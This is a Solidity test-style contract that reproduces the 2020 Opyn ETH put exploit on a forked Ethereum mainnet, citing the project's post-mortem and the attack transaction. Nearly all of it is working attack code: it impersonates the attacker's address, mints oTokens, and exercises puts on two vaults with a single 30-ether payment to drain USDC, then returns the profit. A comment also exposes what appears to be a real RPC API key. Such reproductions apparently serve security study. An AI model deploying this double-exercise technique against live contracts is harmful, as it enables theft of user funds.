// SPDX-License-Identifier: UNLICENSED
// pragma solidity 0.8.17;

interface IOpyn {
    function addERC20CollateralOption(
        uint256 amtToCreate,
        uint256 amtCollateral,
        address receiver
    ) external;

    function exercise(
        uint256 oTokensToExercise,
        address payable[] memory vaultsToExerciseFrom
    ) external payable;

    function removeUnderlying() external;
}

interface IUSDC {
    function Swapin(
        bytes32 txhash,
        address account,
        uint256 amount
    ) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function balanceOf(address) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
}

interface CheatCodes {
    function createSelectFork(string memory _chainName, uint256 _blockNumber) external;

    function startPrank(address _who) external;
}

/*
@Analysis 
https://medium.com/opyn/opyn-eth-put-exploit-post-mortem-1a009e3347a8

@Transaction
0x56de6c4bd906ee0c067a332e64966db8b1e866c7965c044163a503de6ee6552a*/

// forge debug sol/test/Opyn.sol  --sig "test_attack()" --fork-url https://eth-mainnet.g.alchemy.com/v2/P-x0L9coIqzuhfI091DXitR7BzYbABFA --fork-block-number 10592516 --tx-origin 0xe7870231992Ab4b1A01814FA0A599115FE94203f
contract Exploit {
    // function setUp() public {
    // cheats.createSelectFork("mainnet", 10_592_516); //fork mainnet at block 10592516
    // }

    function run() public returns (uint256) {
        IOpyn opyn = IOpyn(0x951D51bAeFb72319d9FBE941E1615938d89ABfe2);

        address attacker = 0xe7870231992Ab4b1A01814FA0A599115FE94203f;

        CheatCodes cheats = CheatCodes(
            0x7109709ECfa91a80626fF3989D68f67F5b1DD12D
        );

        IUSDC usdc = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        cheats.startPrank(attacker);
        cheats.createSelectFork("mainnet", 10_592_516);
        uint256 balBefore = usdc.balanceOf(attacker) / 1e6;

        //Adds ERC20 collateral, and mints new oTokens in one step
        uint256 amtToCreate = 300_000_000;
        uint256 amtCollateral = 9_790_000_000;
        opyn.addERC20CollateralOption(amtToCreate, amtCollateral, attacker);

        //create an arry of vaults
        address payable[] memory _arr = new address payable[](2);
        _arr[0] = payable(attacker);
        _arr[1] = payable(0x01BDb7Ada61C82E951b9eD9F0d312DC9Af0ba0f2);

        //The attacker excercises the put option on two different valuts using the same msg.value
        opyn.exercise{value: 30 ether}(600_000_000, _arr);

        //remove share of underlying after excercise
        opyn.removeUnderlying();

        uint256 balAfter = usdc.balanceOf(attacker) / 1e6;

        return balAfter - balBefore;
    }
}
